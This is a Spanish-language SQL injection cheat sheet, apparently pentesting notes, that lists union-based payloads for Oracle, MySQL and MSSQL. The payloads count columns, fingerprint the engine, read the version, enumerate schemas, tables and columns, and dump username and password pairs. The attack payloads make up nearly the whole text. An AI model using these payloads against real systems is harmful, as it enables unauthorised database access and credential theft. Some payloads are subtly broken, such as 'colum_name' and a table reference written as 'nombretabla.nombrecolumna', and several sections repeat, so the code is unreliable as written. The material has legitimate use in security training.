## Identificación de versión y motor de base de datos
#### Oracle
Identificar el numero de columnas
`' order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error

Una vez ya hemos identificado las columnas debemos probar con un
`' union select 'a','b'-- -` | `' union select 1,2-- -` | `' union select NULL,NULL-- -`, al no mostrarnos nada es una pista de que puede ser una base de datos Oracle para ello deberemos referenciar a una tabla
`' union select 'a','b' from dual-- -`, dual es una tabla que esta siempre presente en las beses de datos de Oracle

Para extraer la versión
`' union select 'a',banner from v$version-- -`, nos devolverá toda la información de la base de datos

#### MySQL y MSSQL
Identificar el numero de columnas
`'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error

Una vez ya hemos identificado las columnas debemos probar con un
`' union select 'a','b'-- -` | `' union select 1,2-- -` | `' union select NULL,NULL-- -`, nos devuelve los valores introducidos en el union select en la pagina por lo cual identificamos que es una base de datos MySQL o MSSQL

Para extraer la versión
`' union select 1,@@version-- -`, nos devolverá toda la información de la base de datos

Para enumerar las bases de datos existentes
`' union select 1,schema_name from information_schema.schemata-- -`

No siempre se nos pueden volcar todas las bases de datos, por lo cual podemos usar 
`' union select 1,schema_name from information_schema.schemata limit 1,1-- -`, donde vamos enumerando uno a uno las bases de datos

Con una base de datos que nos interese podemos acceder a su contenido con
`' union select 1,table_name from information_schema.tables limit 1,1-- -`


## Listar contenido de las bases de datos

#### Oracle
Identificar el numero de columnas
`' order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error

#### MySQL y MSSQL
Identificar el numero de columnas
`'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error

Una vez ya hemos identificado las columnas debemos probar con un
`' union select 'a','b'-- -` | `' union select 1,2-- -` | `' union select NULL,NULL-- -`, nos devuelve los valores introducidos en el union select en la pagina por lo cual identificamos que es una base de datos MySQL o MSSQL

Para enumerar las bases de datos existentes
`' union select 1,schema_name from information_schema.schemata-- -`

Acceder a las tablas de una de las bases de datos existentes
`' union select 1,table_name from information_schema.tables where table_schema='nombrebbdd'-- -`

Enumerar las columnas de una de las tablas de la base de datos existente
`' union select 1,colum_name from information_schema.columns where table_schema='nombrebbdd' and table_name='nombretabla'-- -`

Seleccionar los campos de las columnas de una tabla de una base de datos existente
`' union select username,password from nombrebbdd.nombretabla-- -`

También se pude jugar con concat o group_concat (0x3a hace referencia a ':' )
`' union select 1,concat(username,0x3a,password) from nombretabla.nombrecolumna-- -`
`' union select 1,group_concat(username,0x3a,password) from nombretabla.nombrecolumna-- -`

